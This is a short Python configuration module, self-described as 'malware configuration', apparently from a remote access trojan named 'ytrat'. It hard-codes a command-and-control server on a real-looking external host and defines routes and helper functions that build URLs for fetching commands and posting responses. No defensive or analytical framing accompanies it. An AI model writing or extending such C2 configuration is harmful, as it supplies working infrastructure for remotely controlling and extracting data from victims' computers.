# -*- coding: utf-8 -*-

"""
Configuration file
Provides malware configuration informations
"""

server = {
    'address': 'http://samuelfinocchiodev.altervista.org',
    'port': '80',
}

routes = {
    'base-path': '/ytrat/api/',
    'command': '/command/index.php',
    'response': '/response/index.php'
}

def get_server_address ( ):
    """
    :return: server address
    """
    return server['address'] + ":" + server['port']

def get_command_route ( ):
    """
    :return: route command address
    """
    return get_server_address( ) + routes['base-path'] + routes['command']

def get_response_route ( ):
    """
    :return: route response address
    """
    return get_server_address( ) + routes['base-path'] + routes['response']